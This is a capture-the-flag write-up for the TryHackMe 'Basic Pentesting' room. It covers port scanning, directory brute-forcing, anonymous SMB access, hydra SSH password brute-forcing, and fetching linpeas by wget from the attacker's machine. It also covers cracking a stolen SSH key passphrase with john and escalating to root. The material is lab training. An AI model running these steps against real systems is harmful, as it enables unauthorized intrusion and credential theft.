# Basic Pentesting

![alt text](https://github.com/rizbene/Writeups/blob/main/Tryhackme/Basic%20Pentesting/Image/banner.png)

`Difficulty : Easy`

`Room :` [Basic Pentesting](https://tryhackme.com/r/room/basicpentestingjt)

---

### • Deploy the machine and connect to our network

> _No answer needed_

---

### • Find the services exposed by the machine

> _No answer needed_

```
riz@kali:~$ sudo nmap -A -sS -T5 10.10.215.114
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-22 20:16 WIB
Warning: 10.10.215.114 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.215.114
Host is up (0.36s latency).
Not shown: 982 closed tcp ports (reset)
PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp    open     http           Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp   open     netbios-ssn    Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
280/tcp   filtered http-mgmt
445/tcp   open     netbios-ssn    Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
636/tcp   filtered ldapssl
1098/tcp  filtered rmiactivation
1218/tcp  filtered aeroflight-ads
1494/tcp  filtered citrix-ica
1801/tcp  filtered msmq
2000/tcp  filtered cisco-sccp
2607/tcp  filtered connection
5544/tcp  filtered unknown
8009/tcp  open     ajp13          Apache Jserv (Protocol v1.3)
| ajp-methods:
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp  open     http           Apache Tomcat 9.0.7
|_http-title: Apache Tomcat/9.0.7
|_http-favicon: Apache Tomcat
8651/tcp  filtered unknown
9418/tcp  filtered git
50003/tcp filtered unknown
Aggressive OS guesses: Linux 5.4 (96%), Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.10 (92%), Linux 3.12 (92%), Linux 3.18 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m35s, median: 0s
| smb2-time:
|   date: 2024-05-22T13:18:01
|_  start_date: N/A
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2024-05-22T09:18:01-04:00
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   544.13 ms 10.9.0.1
2   545.73 ms 10.10.215.114

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.34 seconds
```

We got a lot of information about the services that running on the machine.

---

### • What is the name of the hidden directory on the web server(enter name without /)?

> development

That machine was open port on 80 and 8080 which mean that is a web server.

```
80/tcp    open     http           Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
8080/tcp  open     http           Apache Tomcat 9.0.7
|_http-title: Apache Tomcat/9.0.7
|_http-favicon: Apache Tomcat
```

We can do a directory brute using gobuster to find interesting directory, let's do on port 80.

```
riz@kali:~$ gobuster dir -u http://10.10.215.114 -w /home/riz/Downloads/Wordlists/common.txt -t 25
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.215.114
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /home/riz/Downloads/Wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 297]
/.htaccess            (Status: 403) [Size: 297]
/.hta                 (Status: 403) [Size: 292]
/development          (Status: 301) [Size: 320] [--> http://10.10.215.114/development/]
```

We found some interesting directory called `/development`, let's check the directory

![alt text](https://github.com/rizbene/Writeups/blob/main/Tryhackme/Basic%20Pentesting/Image/web.png)

That directory contains 2 files, we can download it and check that files.

```
riz@kali:~$ cat j.txt
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

```
riz@kali:~$ cat dev.txt
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

We got information that there are 2 users, namely J and K. At the first we got the smb port open, let's try to enter into the smb service.

```
139/tcp   open     netbios-ssn    Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open     netbios-ssn    Samba smbd 4.3.11-Ubuntu
```

```
riz@kali:~$ smbclient -L 10.10.215.114
Password for [WORKGROUP\riz]:

	Sharename       Type      Comment
	---------       ----      -------
	Anonymous       Disk
	IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            BASIC2
```

There is one sharing directory called `Anonymous`, we can try to enter it.

```
riz@kali:~$ smbclient //10.10.215.114/Anonymous
Password for [WORKGROUP\riz]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Apr 20 00:31:20 2018
  ..                                  D        0  Fri Apr 20 00:13:06 2018
  staff.txt                           N      173  Fri Apr 20 00:29:55 2018

		14318640 blocks of size 1024. 11092764 blocks available
smb: \> get staff.txt
getting file \staff.txt of size 173 as staff.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

In smb there is one interesting file called `staff.txt`, which might be used as a clue.

```
riz@kali:~$ cat staff.txt
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
```

Aight, the contents of the file stated that there were 2 users, related from before, it turned out that j was `jan` and k was `kay`.

---

### • User brute-forcing to find the username & password

> _No answer needed_

```
riz@kali:~$ hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.215.114 -f
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-22 20:31:06
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.215.114:22/
[STATUS] 111.00 tries/min, 111 tries in 00:01h, 14344289 to do in 2153:48h, 15 active
[STATUS] 105.33 tries/min, 316 tries in 00:03h, 14344084 to do in 2269:39h, 15 active
[22][ssh] host: 10.10.215.114   login: jan   password: armando
[STATUS] attack finished for 10.10.215.114 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-22 20:35:26
```

We got 1 valid password found, the username is `jan` and the password is `armando`

---

### • What is the username?

> jan

---

### • What is the password?

> armando

---

### • What service do you use to access the server(answer in abbreviation in all caps)?

> SSH

```
riz@kali:~$ ssh jan@10.10.215.114
jan@10.10.215.114's password:
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Thu May 23 09:18:28 2024 from 10.9.203.24
jan@basic2:~$
```

We're inside the jan shell.

---

### • Enumerate the machine to find any vectors for privilege escalation

> _No answer needed_

Do an simple web server for transfer linpeas to victim machine.

```
riz@kali:~$ python -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
jan@basic2:/home$ cd /tmp
jan@basic2:/tmp$ wget http://10.9.203.24:8000/linpeas.sh
--2024-05-23 08:07:18--  http://10.9.203.24:8000/linpeas.sh
Connecting to 10.9.203.24:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 134168 (131K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh              100%[==============================>] 131.02K   104KB/s    in 1.3s

2024-05-23 08:07:20 (104 KB/s) - ‘linpeas.sh’ saved [134168/134168]

jan@basic2:/tmp$ chmod +x linpeas.sh
```

```
jan@basic2:/tmp$ ./linpeas.sh
~
~
~
Private SSH keys found!:
/home/kay/.ssh/id_rsa
~
~
~
```

Linpeas found an interesting file in `/home/kay/.ssh/id_rsa`. That file can be used for connected to ssh with private key.

```
jan@basic2:~$ cat /home/kay/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75
~
~
~
-----END RSA PRIVATE KEY-----
```

We tried to crack a private key file to find a passphrase using `ssh2john`.

```
riz@kali:~$ ssh2john id_rsa > id_rsa.hash

riz@kali:~$ john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (id_rsa)
1g 0:00:00:00 DONE (2024-05-22 21:47) 50.00g/s 4137Kp/s 4137Kc/s 4137KC/s bolabola..bammer
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

And we got it, the passphrase was `beeswax`. Tried to login with the passphrase.

```
riz@kali:~$ chmod 600 id_rsa

riz@kali:~$ ssh -i id_rsa kay@10.10.215.114
Enter passphrase for key 'id_rsa':
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Mon Apr 23 16:04:07 2018 from 192.168.56.102
kay@basic2:~$
```

Yeaa, we got a kay shell.

---

### • What is the name of the other user you found(all lower case)?

> kay

```
jan@basic2:~$ pwd
/home/jan
jan@basic2:~$ cd ..
jan@basic2:/home$ ls
jan  kay
```

---

### • If you have found another user, what can you do with this information?

> _No answer needed_

---

### • What is the final password you obtain?

> heresareallystrongpasswordthatfollowsthepasswordpolicy$$

```
kay@basic2:~$ ls
pass.bak
kay@basic2:~$ cat pass.bak
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

We can also used the password to switch to super user, and we got a root access.

```
kay@basic2:~$ sudo su
[sudo] password for kay:
root@basic2:/home/kay# id
uid=0(root) gid=0(root) groups=0(root)
```
